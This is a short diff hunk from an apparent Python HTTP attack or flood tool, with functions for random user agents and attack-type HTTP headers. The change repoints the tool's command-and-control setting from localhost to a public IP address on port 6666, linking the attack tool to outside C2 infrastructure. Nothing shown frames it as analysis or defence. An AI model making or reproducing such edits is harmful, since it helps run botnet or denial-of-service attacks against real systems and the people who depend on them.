@@ -191,8 +191,8 @@ def rand_ua(mode):
         ua = user_gen2()
     return ua
 
-C2_ADDRESS  = "127.0.0.1"
-C2_PORT     = 8080
+C2_ADDRESS  = "117.50.197.134"
+C2_PORT     = 6666
 
 def header_http(host,type_attack,mode_type,ver):
     if mode_type == "PYF":
